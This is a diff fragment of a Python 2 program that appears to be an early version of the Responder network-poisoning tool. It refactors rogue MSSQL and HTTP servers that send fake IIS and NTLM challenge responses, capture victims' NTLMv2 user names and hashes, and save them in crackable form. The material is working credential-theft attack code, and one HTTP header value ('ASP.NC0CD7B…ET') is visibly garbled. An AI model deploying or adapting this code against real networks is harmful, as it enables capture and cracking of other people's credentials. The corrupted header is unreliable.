        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-       print "[+]MSSQL NTLMv2 User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
        logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
        outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
        Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
@@ -649,7 +462,7 @@ class MSSQL(SocketServer.BaseRequestHandler):
                 data = self.request.recv(1024)
              ##NegoSSP
               if data[0] == "\x10":
-                t = MSSQLNTLMChallengeAnswer()
+                t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
                 t.calculate()
                 buffer1 = str(t) 
                 self.request.send(buffer1)
@@ -744,117 +557,7 @@ def RunLLMNR():
 ##################################################################################
 #HTTP Stuff
 ##################################################################################
-
-#HTTP Packet used for further NTLM auth.
-class IIS_Auth_401_Ans(Packet):
-    fields = OrderedDict([
-        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
-        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
-        ("Type",          "Content-Type: text/html\r\n"),
-        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
-        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
-        ("Len",           "Content-Length: 0\r\n"), 
-        ("CRLF",          "\r\n"),                               
-    ])
-
-#HTTP NTLM Auth
-class NTLM_Challenge(Packet):
-    fields = OrderedDict([
-        ("Signature",        "NTLMSSP"),
-        ("SignatureNull",    "\x00"),
-        ("MessageType",      "\x02\x00\x00\x00"),
-        ("TargetNameLen",    "\x06\x00"),
-        ("TargetNameMaxLen", "\x06\x00"),
-        ("TargetNameOffset", "\x38\x00\x00\x00"),
-        ("NegoFlags",        "\x05\x02\x89\xa2"),
-        ("ServerChallenge",  Challenge),
-        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
-        ("TargetInfoLen",    "\x7e\x00"),
-        ("TargetInfoMaxLen", "\x7e\x00"),
-        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
-        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
-        ("TargetNameStr",    "SMB"),
-        ("Av1",              "\x02\x00"),#nbt name
-        ("Av1Len",           "\x06\x00"),
-        ("Av1Str",           "SMB"),
-        ("Av2",              "\x01\x00"),#Server name
-        ("Av2Len",           "\x14\x00"),
-        ("Av2Str",           "SMB-TOOLKIT"),
-        ("Av3",              "\x04\x00"),#Full Domain name
-        ("Av3Len",           "\x12\x00"),
-        ("Av3Str",           "smb.local"),
-        ("Av4",              "\x03\x00"),#Full machine domain name
-        ("Av4Len",           "\x28\x00"),
-        ("Av4Str",           "server2003.smb.local"),
-        ("Av5",              "\x05\x00"),#Domain Forest Name
-        ("Av5Len",           "\x12\x00"),
-        ("Av5Str",           "smb.local"),
-        ("Av6",              "\x00\x00"),#AvPairs Terminator
-        ("Av6Len",           "\x00\x00"),             
-    ])
-
-    def calculate(self):
-        ##First convert to uni
-        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
-        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
-        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
-        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
-        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
-        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
-      
-        ##Then calculate
-        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])
-
-        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])
-
-        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])
-
-        # Target Name Offsets
-        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
-        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
-        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
-        #AvPairs Offsets
-        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
-        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
-        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
-        #AvPairs StrLen
-        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
-        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
-        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
-        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
-        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]
-
-#HTTP NTLM packet.
-class IIS_NTLM_Challenge_Ans(Packet):
-    fields = OrderedDict([
-        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
-        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
-        ("Type",          "Content-Type: text/html\r\n"),
-        ("WWWAuth",       "WWW-Authenticate: NTLM "),
-        ("Payload",       ""),
-        ("Payload-CRLF",  "\r\n"),
-        ("PoweredBy",     "X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET\r\n"),
-        ("Len",           "Content-Length: 0\r\n"),
-        ("CRLF",          "\r\n"),                                            
-    ])
-
-    def calculate(self,payload):
-        self.fields["Payload"] = b64encode(payload)
-
-#HTTP Basic answer packet.
-class IIS_Basic_401_Ans(Packet):
-    fields = OrderedDict([
-        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
-        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
-        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
-        ("Type",          "Content-Type: text/html\r\n"),
-        ("WWW-Auth",      "WWW-Authenticate: Basic realm=''\r\n"),
-        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
-        ("Len",           "Content-Length: 0\r\n"), 
-        ("CRLF",          "\r\n"),                               
-    ])
+from HTTPPackets import *
 
 #Parse NTLMv1/v2 hash.
 def ParseHTTPHash(data,client):
@@ -934,7 +637,7 @@ def PacketSequence(data,client):
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
           GrabCookie(data,client)
-          r = NTLM_Challenge()
+          r = NTLM_Challenge(ServerChallenge=Challenge)
           r.calculate()
           t = IIS_NTLM_Challenge_Ans()
           t.calculate(str(r))
@@ -972,6 +675,10 @@ class HTTP(SocketServer.BaseRequestHandler):
            pass#No need to be verbose..
            self.request.close()
 
+##################################################################################
+#Loading the servers
+##################################################################################
+
 #Function name self-explanatory
 def Is_HTTP_On(on_off):
     if on_off == "ON":
@@ -994,9 +701,6 @@ def Is_SQL_On(SQL_On_Off):
     if SQL_On_Off == "OFF":
        return False
 
-##################################################################################
-#Loading the servers
-##################################################################################
 SocketServer.UDPServer.allow_reuse_address = 1
 SocketServer.TCPServer.allow_reuse_address = 1
 
@@ -1032,7 +736,6 @@ if __name__ == '__main__':
     except:
         raise
     raw_input()
-
 
 
 
